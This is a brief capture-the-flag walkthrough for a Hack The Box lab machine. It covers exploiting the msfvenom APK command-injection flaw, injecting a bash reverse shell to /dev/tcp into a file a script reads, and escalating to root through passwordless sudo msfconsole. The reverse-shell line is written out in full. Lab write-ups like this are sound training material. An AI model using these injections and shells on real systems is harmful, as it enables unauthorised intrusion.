```10.10.10.226```

1. Nmap Scan- 2 Ports open

22 with ssh running
5000 with Werkzeug

2. There are 3 tools on the page: Nmap, MsfVenom and Searchsploit. They all worked as per usual. Realising I was getting nowhere, I started Googling about vulnerabilities these tools may have and stumbled upon CVE-2020-7384: MsfVenom APK template command injection.

3. Using msfconsole.It is found that only two parameters are needed, listening address and port, and you can directly enter the address of HTB. The default port is 4444. The apk file will be generated after the exploit.

4. I started a netcat listener and uploaded the file and got a shell

5. User Flag in home-> kid directory
After enumerating the machine, I found another user pwnand a script in the user’s home directory. Analysing the script, I realised that Nmap was running against a file called hackers.

6. I fired up another Netcat listener to catch any incoming shells and used a bash script to run a reverse shell to access the pwn user account

echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.79/1234 0>&1' #" >> hackers

7. Next, I checked the permissions this user had and realised that it could run MsfConsole as root without a password.

8. Thus, I ran sudo msfconsole, used the command /bin/bash to open a shell and found the root hash!